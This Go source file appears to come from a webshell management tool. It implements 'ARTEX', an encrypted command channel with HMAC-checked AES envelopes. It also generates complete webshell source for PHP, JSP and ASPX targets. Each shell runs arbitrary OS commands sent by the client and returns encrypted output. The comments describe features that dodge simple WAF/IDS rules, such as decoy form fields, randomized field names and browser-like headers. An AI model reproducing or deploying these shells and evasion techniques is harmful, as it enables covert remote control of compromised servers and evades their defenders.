package webshell

// ARTEX 自研加密通道（artex_crypt_*）。
//
// 目标侧马只做四件事：验证 HMAC、解出命令、执行、把输出重新加密。和冰蝎/哥斯拉
// 不同，这里不加载任何「payload 代码」，因此流量里没有 eval/assert 之类的明文特征。
//
// 信封格式（全部 base64url，无 = 号）：
//
//	iv(16) || AES-256-CBC(keyEnc, PKCS#7(ver||gzip?data)) || HMAC-SHA256(keyMac, iv||ct)
//
// keyEnc/keyMac 由 HMAC-SHA256(secret, "artex:enc:v1" / "artex:mac:v1") 派生，
// 每个连接口令一份，互不复用。随机 IV 让同一命令每次的密文都不同；HMAC 用
// encrypt-then-MAC 覆盖整个信封，响应被篡改会直接判为无效。
//
// 面向简单 WAF/IDS 的处理（不针对任何具体产品，也不做规避检测的对抗）：
//   - 命令与输出都不以明文出现，请求里没有固定命令关键字；
//   - 字节用 base64url，避免 = + / 这些常见规则字符；
//   - 每次请求附带 2~3 个随机名、随机值的诱饵表单字段；
//   - 表单字段名由马生成时固定（默认 d），可改成任意合法标识符；
//   - 较大的正文自动 gzip 后再加密，缩短请求并降低长度特征；
//   - 使用浏览器 UA、Accept、Referer 等日常头，形状与普通 XHR 表单一致。

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"io"
	"net/url"
	"strings"
	"time"
)

const (
	FamilyArtexCrypt = "artex_crypt"
)

const (
	artexCryptIVLen     = 16
	artexCryptTagLen    = 32
	artexCryptVerRaw    = 1
	artexCryptVerGzip   = 2
	artexCryptGzipAbove = 512
)

var ErrArtexCryptDecode = errors.New("自研加密通道响应校验失败")

func artexCryptLanguage(shellType string) (string, bool) {
	switch shellType {
	case TypeArtexCryptPHP:
		return "php", true
	case TypeArtexCryptJSP:
		return "jsp", true
	case TypeArtexCryptASPX:
		return "aspx", true
	}
	return "", false
}

// IsArtexCryptType reports whether shellType speaks ARTEX's own encrypted envelope.
func IsArtexCryptType(shellType string) bool {
	_, ok := artexCryptLanguage(shellType)
	return ok
}

func artexCryptKeys(secret string) (encKey, macKey []byte) {
	derive := func(label string) []byte {
		h := hmac.New(sha256.New, []byte(secret))
		h.Write([]byte(label))
		return h.Sum(nil)
	}
	return derive("artex:enc:v1"), derive("artex:mac:v1")
}

func artexCryptSeal(secret string, payload []byte) (string, error) {
	encKey, macKey := artexCryptKeys(secret)
	ver := byte(artexCryptVerRaw)
	body := payload
	if len(payload) > artexCryptGzipAbove {
		var buf bytes.Buffer
		zw, _ := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
		if _, err := zw.Write(payload); err == nil && zw.Close() == nil && buf.Len() < len(payload) {
			body = buf.Bytes()
			ver = artexCryptVerGzip
		}
	}
	plain := make([]byte, 0, len(body)+1)
	plain = append(plain, ver)
	plain = append(plain, body...)

	iv := make([]byte, artexCryptIVLen)
	if _, err := rand.Read(iv); err != nil {
		return "", err
	}
	ct, err := aesCBCEncrypt(encKey, iv, plain)
	if err != nil {
		return "", err
	}
	env := make([]byte, 0, len(iv)+len(ct)+artexCryptTagLen)
	env = append(env, iv...)
	env = append(env, ct...)
	env = append(env, hmacTag(macKey, env)...)
	return base64.RawURLEncoding.EncodeToString(env), nil
}

func artexCryptOpen(secret, encoded string) ([]byte, error) {
	encKey, macKey := artexCryptKeys(secret)
	env, err := decodeBase64URL(encoded)
	if err != nil || len(env) < artexCryptIVLen+16+artexCryptTagLen {
		return nil, ErrArtexCryptDecode
	}
	iv := env[:artexCryptIVLen]
	ct := env[artexCryptIVLen : len(env)-artexCryptTagLen]
	tag := env[len(env)-artexCryptTagLen:]
	if !hmac.Equal(hmacTag(macKey, env[:len(env)-artexCryptTagLen]), tag) {
		return nil, ErrArtexCryptDecode
	}
	plain, err := aesCBCDecrypt(encKey, iv, ct)
	if err != nil || len(plain) == 0 {
		return nil, ErrArtexCryptDecode
	}
	body := plain[1:]
	if plain[0] == artexCryptVerGzip {
		zr, err := gzip.NewReader(bytes.NewReader(body))
		if err != nil {
			return nil, ErrArtexCryptDecode
		}
		defer zr.Close()
		out, err := io.ReadAll(io.LimitReader(zr, maxOutputBytes))
		if err != nil {
			return nil, ErrArtexCryptDecode
		}
		return out, nil
	}
	if plain[0] != artexCryptVerRaw {
		return nil, ErrArtexCryptDecode
	}
	return body, nil
}

func hmacTag(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func decodeBase64URL(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if b, err := base64.RawURLEncoding.DecodeString(s); err == nil {
		return b, nil
	}
	return base64.URLEncoding.DecodeString(s)
}

// execArtexCrypt 发一次加密请求。没有服务端会话状态，也不依赖 Cookie。
func execArtexCrypt(ctx context.Context, t *Target, input string, timeout time.Duration) (*Outcome, error) {
	begin, end, err := marker()
	if err != nil {
		return nil, err
	}
	sealed, err := artexCryptSeal(t.secret(), []byte(begin+"\n"+end+"\n"+input))
	if err != nil {
		return nil, err
	}

	form := url.Values{}
	form.Set(t.param(), sealed)
	for i := 0; i < 2+randomInt(2); i++ {
		name := randomFieldName(6 + randomInt(5))
		if name == t.param() {
			continue
		}
		form.Set(name, randomDecoyValue())
	}
	body := []byte(form.Encode())

	headers := map[string]string{
		"Accept":           "application/json, text/javascript, */*; q=0.01",
		"Accept-Language":  "zh-CN,zh;q=0.9,en;q=0.8",
		"X-Requested-With": "XMLHttpRequest",
		"Cache-Control":    "no-cache",
		"Pragma":           "no-cache",
	}
	if u, err := url.Parse(t.URL); err == nil && u.Host != "" {
		headers["Origin"] = u.Scheme + "://" + u.Host
		headers["Referer"] = u.Scheme + "://" + u.Host + "/"
	}

	sess := getXSession(t, t.InsecureTLS)
	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.lastUsed = time.Now()

	status, data, elapsed, err := xDo(ctx, sess, "POST", t.URL,
		"application/x-www-form-urlencoded; charset=UTF-8", body, headers, timeout)
	if err != nil {
		return nil, err
	}
	out := &Outcome{Status: status, Elapsed: elapsed, Raw: string(data)}
	plain, derr := artexCryptOpen(t.secret(), string(data))
	if derr != nil {
		return out, nil
	}
	out.Output, out.Parsed = splitMarked(string(plain), begin, end)
	return out, nil
}

func randomInt(n int) int {
	if n <= 0 {
		return 0
	}
	var b [1]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 0
	}
	return int(b[0]) % n
}

const randomNameAlphabet = "abcdefghijklmnopqrstuvwxyz"

func randomFieldName(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "id"
	}
	for i := range b {
		b[i] = randomNameAlphabet[int(b[i])%len(randomNameAlphabet)]
	}
	return string(b)
}

func randomDecoyValue() string {
	b := make([]byte, 12+randomInt(13))
	if _, err := rand.Read(b); err != nil {
		return "1"
	}
	return base64.RawURLEncoding.EncodeToString(b)
}

// ---- 配套马源码 ----

func shellArtexCryptPHP(param, secret string) string {
	encKey, macKey := artexCryptKeys(secret)
	ke := base64.StdEncoding.EncodeToString(encKey)
	km := base64.StdEncoding.EncodeToString(macKey)
	return `<?php
@error_reporting(0);
@set_time_limit(0);
$ke = base64_decode("` + ke + `");
$km = base64_decode("` + km + `");
$f = "` + phpEscaper.Replace(param) + `";
function artex_rand($n) {
    if (function_exists("random_bytes")) { return random_bytes($n); }
    return openssl_random_pseudo_bytes($n);
}
function artex_eq($a, $b) {
    if (function_exists("hash_equals")) { return hash_equals($a, $b); }
    if (!is_string($a) || !is_string($b) || strlen($a) !== strlen($b)) { return false; }
    $r = 0;
    for ($i = 0; $i < strlen($a); $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
    return $r === 0;
}
function artex_dec($s, $ke, $km) {
    $raw = base64_decode(strtr($s, "-_", "+/"), true);
    if ($raw === false || strlen($raw) < 64) { return false; }
    $iv = substr($raw, 0, 16);
    $ct = substr($raw, 16, strlen($raw) - 48);
    $tag = substr($raw, -32);
    if (!artex_eq(hash_hmac("sha256", $iv . $ct, $km, true), $tag)) { return false; }
    $data = openssl_decrypt($ct, "AES-256-CBC", $ke, OPENSSL_RAW_DATA, $iv);
    if ($data === false || $data === "") { return false; }
    $v = ord($data[0]);
    $body = substr($data, 1);
    if ($v === 2) { $body = @gzdecode($body); }
    return $body;
}
function artex_enc($s, $ke, $km) {
    $v = 1;
    if (strlen($s) > 512) {
        $z = @gzencode($s, 6);
        if ($z !== false && strlen($z) < strlen($s)) { $s = $z; $v = 2; }
    }
    $iv = artex_rand(16);
    $ct = openssl_encrypt(chr($v) . $s, "AES-256-CBC", $ke, OPENSSL_RAW_DATA, $iv);
    if ($ct === false) { return ""; }
    $env = $iv . $ct . hash_hmac("sha256", $iv . $ct, $km, true);
    return rtrim(strtr(base64_encode($env), "+/", "-_"), "=");
}
if (!isset($_POST[$f])) { exit; }
$pkg = artex_dec($_POST[$f], $ke, $km);
if ($pkg === false) { exit; }
$parts = explode("\n", $pkg, 3);
if (count($parts) < 3) { exit; }
$cmd = $parts[2];
$o = "";
if (function_exists("shell_exec")) {
    $o = @shell_exec($cmd . " 2>&1");
} elseif (function_exists("system")) {
    ob_start(); @system($cmd . " 2>&1"); $o = ob_get_clean();
} elseif (function_exists("passthru")) {
    ob_start(); @passthru($cmd . " 2>&1"); $o = ob_get_clean();
} elseif (function_exists("popen")) {
    $h = @popen($cmd . " 2>&1", "r");
    if ($h) { while (!feof($h)) { $o .= fread($h, 4096); } @pclose($h); }
} else {
    $o = "artex: 目标 PHP 禁用了全部命令执行函数";
}
echo artex_enc($parts[0] . $o . $parts[1], $ke, $km);
`
}

// phpEscaper 只用于把参数名放进 PHP 双引号字符串；server 已把参数限制在
// [A-Za-z0-9_.-]，这里再做一层兜底。
var phpEscaper = strings.NewReplacer("\\", "\\\\", "\"", "\\\"", "$", "\\$")

var jspEscaper = strings.NewReplacer("\\", "\\\\", "\"", "\\\"", "\n", "\\n", "\r", "\\r")

func shellArtexCryptJSP(param, secret string) string {
	encKey, macKey := artexCryptKeys(secret)
	ke := base64.StdEncoding.EncodeToString(encKey)
	km := base64.StdEncoding.EncodeToString(macKey)
	return `<%@page import="java.util.*,java.io.*,java.security.*,javax.crypto.*,javax.crypto.spec.*,java.util.zip.*"%>
<%!
static final byte[] KE = java.util.Base64.getDecoder().decode("` + ke + `");
static final byte[] KM = java.util.Base64.getDecoder().decode("` + km + `");
static final String F = "` + jspEscaper.Replace(param) + `";
static byte[] mac(byte[] d) throws Exception {
    Mac m = Mac.getInstance("HmacSHA256");
    m.init(new SecretKeySpec(KM, "HmacSHA256"));
    return m.doFinal(d);
}
static boolean eq(byte[] a, byte[] b) {
    if (a.length != b.length) { return false; }
    int r = 0;
    for (int i = 0; i < a.length; i++) { r |= a[i] ^ b[i]; }
    return r == 0;
}
static byte[] dec(String s) throws Exception {
    byte[] raw = Base64.getUrlDecoder().decode(s);
    if (raw.length < 64) { return null; }
    byte[] iv = Arrays.copyOfRange(raw, 0, 16);
    byte[] ct = Arrays.copyOfRange(raw, 16, raw.length - 32);
    byte[] tag = Arrays.copyOfRange(raw, raw.length - 32, raw.length);
    ByteArrayOutputStream head = new ByteArrayOutputStream();
    head.write(iv);
    head.write(ct);
    if (!eq(mac(head.toByteArray()), tag)) { return null; }
    Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
    c.init(2, new SecretKeySpec(KE, "AES"), new IvParameterSpec(iv));
    byte[] p = c.doFinal(ct);
    if (p.length < 1) { return null; }
    int v = p[0] & 0xff;
    byte[] body = Arrays.copyOfRange(p, 1, p.length);
    if (v == 2) {
        GZIPInputStream g = new GZIPInputStream(new ByteArrayInputStream(body));
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = g.read(buf)) > 0) { bo.write(buf, 0, n); }
        g.close();
        return bo.toByteArray();
    }
    return body;
}
static String enc(byte[] data) throws Exception {
    int v = 1;
    if (data.length > 512) {
        ByteArrayOutputStream z = new ByteArrayOutputStream();
        GZIPOutputStream g = new GZIPOutputStream(z);
        g.write(data);
        g.close();
        if (z.size() < data.length) { data = z.toByteArray(); v = 2; }
    }
    byte[] plain = new byte[data.length + 1];
    plain[0] = (byte) v;
    System.arraycopy(data, 0, plain, 1, data.length);
    byte[] iv = new byte[16];
    new SecureRandom().nextBytes(iv);
    Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
    c.init(1, new SecretKeySpec(KE, "AES"), new IvParameterSpec(iv));
    byte[] ct = c.doFinal(plain);
    ByteArrayOutputStream env = new ByteArrayOutputStream();
    env.write(iv);
    env.write(ct);
    env.write(mac(env.toByteArray()));
    return Base64.getUrlEncoder().withoutPadding().encodeToString(env.toByteArray());
}
%>
<%
String p = request.getParameter(F);
if (p != null) {
    try {
        byte[] pkg = dec(p);
        if (pkg != null) {
            String d = new String(pkg, "UTF-8");
            int i1 = d.indexOf('\n');
            int i2 = d.indexOf('\n', i1 + 1);
            if (i1 < 0 || i2 <= i1) { return; }
            String b = d.substring(0, i1);
            String e = d.substring(i1 + 1, i2);
            String c = d.substring(i2 + 1);
            boolean win = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
            ProcessBuilder pb = win ? new ProcessBuilder(new String[]{"cmd.exe", "/c", c})
                                    : new ProcessBuilder(new String[]{"/bin/sh", "-c", c});
            pb.redirectErrorStream(true);
            Process pr = pb.start();
            InputStream in = pr.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0) { bo.write(buf, 0, n); }
            pr.waitFor();
            out.print(enc((b + new String(bo.toByteArray(), "UTF-8") + e).getBytes("UTF-8")));
        }
    } catch (Exception e) {
    }
}
%>
`
}

func shellArtexCryptASPX(param, secret string) string {
	encKey, macKey := artexCryptKeys(secret)
	ke := base64.StdEncoding.EncodeToString(encKey)
	km := base64.StdEncoding.EncodeToString(macKey)
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
static readonly byte[] KE = Convert.FromBase64String("` + ke + `");
static readonly byte[] KM = Convert.FromBase64String("` + km + `");
static readonly string F = "` + jspEscaper.Replace(param) + `";
static byte[] Mac(byte[] d) {
    using (HMACSHA256 h = new HMACSHA256(KM)) { return h.ComputeHash(d); }
}
static bool Eq(byte[] a, byte[] b) {
    if (a == null || b == null || a.Length != b.Length) { return false; }
    int r = 0;
    for (int i = 0; i < a.Length; i++) { r |= a[i] ^ b[i]; }
    return r == 0;
}
static byte[] Dec(string s) {
    s = s.Replace('-', '+').Replace('_', '/');
    switch (s.Length % 4) {
        case 2: s += "=="; break;
        case 3: s += "="; break;
    }
    byte[] raw = Convert.FromBase64String(s);
    if (raw.Length < 64) { return null; }
    byte[] iv = new byte[16];
    System.Buffer.BlockCopy(raw, 0, iv, 0, 16);
    int ctLen = raw.Length - 48;
    byte[] ct = new byte[ctLen];
    System.Buffer.BlockCopy(raw, 16, ct, 0, ctLen);
    byte[] tag = new byte[32];
    System.Buffer.BlockCopy(raw, raw.Length - 32, tag, 0, 32);
    byte[] head = new byte[16 + ctLen];
    System.Buffer.BlockCopy(iv, 0, head, 0, 16);
    System.Buffer.BlockCopy(ct, 0, head, 16, ctLen);
    if (!Eq(Mac(head), tag)) { return null; }
    using (RijndaelManaged aes = new RijndaelManaged()) {
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = KE;
        aes.IV = iv;
        byte[] p;
        using (ICryptoTransform tr = aes.CreateDecryptor()) { p = tr.TransformFinalBlock(ct, 0, ct.Length); }
        if (p.Length < 1) { return null; }
        int v = p[0];
        byte[] body = new byte[p.Length - 1];
        System.Buffer.BlockCopy(p, 1, body, 0, body.Length);
        if (v == 2) {
            using (GZipStream g = new GZipStream(new MemoryStream(body), CompressionMode.Decompress)) {
                using (MemoryStream bo = new MemoryStream()) {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = g.Read(buf, 0, buf.Length)) > 0) { bo.Write(buf, 0, n); }
                    return bo.ToArray();
                }
            }
        }
        return body;
    }
}
static string Enc(byte[] data) {
    int v = 1;
    if (data.Length > 512) {
        using (MemoryStream z = new MemoryStream()) {
            using (GZipStream g = new GZipStream(z, CompressionMode.Compress, true)) { g.Write(data, 0, data.Length); }
            byte[] packed = z.ToArray();
            if (packed.Length < data.Length) { data = packed; v = 2; }
        }
    }
    byte[] plain = new byte[data.Length + 1];
    plain[0] = (byte) v;
    System.Buffer.BlockCopy(data, 0, plain, 1, data.Length);
    byte[] iv = new byte[16];
    using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider()) { rng.GetBytes(iv); }
    byte[] ct;
    using (RijndaelManaged aes = new RijndaelManaged()) {
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = KE;
        aes.IV = iv;
        using (ICryptoTransform tr = aes.CreateEncryptor()) { ct = tr.TransformFinalBlock(plain, 0, plain.Length); }
    }
    byte[] head = new byte[16 + ct.Length];
    System.Buffer.BlockCopy(iv, 0, head, 0, 16);
    System.Buffer.BlockCopy(ct, 0, head, 16, ct.Length);
    byte[] tag = Mac(head);
    byte[] env = new byte[head.Length + tag.Length];
    System.Buffer.BlockCopy(head, 0, env, 0, head.Length);
    System.Buffer.BlockCopy(tag, 0, env, head.Length, tag.Length);
    return Convert.ToBase64String(env).TrimEnd('=').Replace('+', '-').Replace('/', '_');
}
static string Exec(string cmd) {
    System.Diagnostics.ProcessStartInfo psi;
    if (Environment.OSVersion.Platform == PlatformID.Win32NT)
        psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
    else
        psi = new System.Diagnostics.ProcessStartInfo("/bin/sh", "-c " + Quote(cmd));
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    using (System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi)) {
        MemoryStream so = new MemoryStream();
        MemoryStream se = new MemoryStream();
        Thread t1 = new Thread(delegate() { Copy(p.StandardOutput.BaseStream, so); });
        Thread t2 = new Thread(delegate() { Copy(p.StandardError.BaseStream, se); });
        t1.Start();
        t2.Start();
        p.WaitForExit();
        t1.Join();
        t2.Join();
        byte[] a = so.ToArray();
        byte[] b = se.ToArray();
        byte[] all = new byte[a.Length + b.Length];
        System.Buffer.BlockCopy(a, 0, all, 0, a.Length);
        System.Buffer.BlockCopy(b, 0, all, a.Length, b.Length);
        return Encoding.UTF8.GetString(all);
    }
}
static void Copy(Stream input, Stream output) {
    byte[] buf = new byte[4096];
    int n;
    while ((n = input.Read(buf, 0, buf.Length)) > 0) { output.Write(buf, 0, n); }
}
static string Quote(string s) {
    return "'" + s.Replace("'", "'\\''") + "'";
}
protected void Page_Load(object sender, EventArgs e) {
    string p = Request.Form[F];
    if (p == null) { return; }
    try {
        byte[] pkg = Dec(p);
        if (pkg == null) { return; }
        string d = Encoding.UTF8.GetString(pkg);
        string[] parts = d.Split(new char[]{'\n'}, 3);
        if (parts.Length < 3) { return; }
        string o = Exec(parts[2]);
        Response.Write(Enc(Encoding.UTF8.GetBytes(parts[0] + o + parts[1])));
    } catch (Exception) {
    }
}
</script>
`
}
